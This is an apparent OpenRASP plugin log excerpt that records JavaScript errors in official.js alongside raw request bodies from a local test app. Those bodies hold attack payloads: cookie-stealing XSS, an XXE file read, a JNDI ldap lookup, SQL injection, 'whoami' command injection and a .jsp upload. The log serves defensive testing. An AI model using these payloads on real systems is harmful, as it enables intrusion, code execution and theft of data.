+2024-05-06 23:52:55,491 INFO  [http-nio-8002-exec-46][com.baidu.openrasp.plugin.js.log] official.js:919
+    for (; i < stacks.length; i++) {
+ReferenceError: stacks is not defined
+    at is_method_from_rasp (official.js:919:16)
+    at Object.func (official.js:2066:78)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:52:56,009 INFO  [http-nio-8002-exec-53][com.baidu.openrasp.plugin.js.log] http://localhost:8002/SSRF/json/httpClient.do <native code>:0
+----------------------------446541773329873822470613
+SyntaxError: Unexpected number in JSON at position 1
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:52:56,316 INFO  [http-nio-8002-exec-51][com.baidu.openrasp.plugin.js.log] http://localhost:8002/CMD/json/cmd.do <native code>:0
+"file": "./1.txt"}root><file>/usr/share/locale/locale.alias</file></root>str=%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E"root":{"xml":"<!DOCTYPE test [<!ELEMENT test ANY ><!ENTITY title SYSTEM 'file:///usr' >]><article><title>&title;</title></article>"}}"req":"POST /FileUpload/upload.do HTTP/1.1\nHost: localhost:8001\nContent-Length: 539\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nOrigin: null\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryWqGd83IIbg2U327I\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9,en;q=0.8\nConnection: close\n\n------WebKitFormBoundaryWqGd83IIbg2U327I\nContent-Disposition: form-data; name=\"username\"\n\nadmin\n------WebKitFormBoundaryWqGd83IIbg2U327I\nContent
+SyntaxError: Unexpected token : in JSON at position 6
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:52:56,417 INFO  [http-nio-8002-exec-10][com.baidu.openrasp.plugin.js.log] http://localhost:8002/CMD/json/unixProcess.do <native code>:0
+root><file>/usr/share/locale/locale.alias</file></root>file=test.jsp&content=test"file": "/usr/share/locale/locale.alias"}"root": {"userId": "${jndi:ldap://localhost:8888}"}}"file": "1.txt", "dest": "1.jsp"}"cmd": "whoami"}root><username>'/**/or/**/username='root</username></root>"root": {"url":"https://www.baidu.com"}}root><file>/usr/share/locale/locale.alias</file></root>root><cmd>whoami</cmd></root>----------------------------474240179298216013159378
+SyntaxError: Unexpected token r in JSON at position 0
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:52:56,439 INFO  [http-nio-8002-exec-36][com.baidu.openrasp.plugin.js.log] http://localhost:8002/CMD/json/unixProcess.do <native code>:0
+root><file>./1.txt</file></root>root><file>./1.txt</file></root>root><file>test.jsp</file><content>test</content></root>"cmd": "whoami"}
+SyntaxError: Unexpected token r in JSON at position 0
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
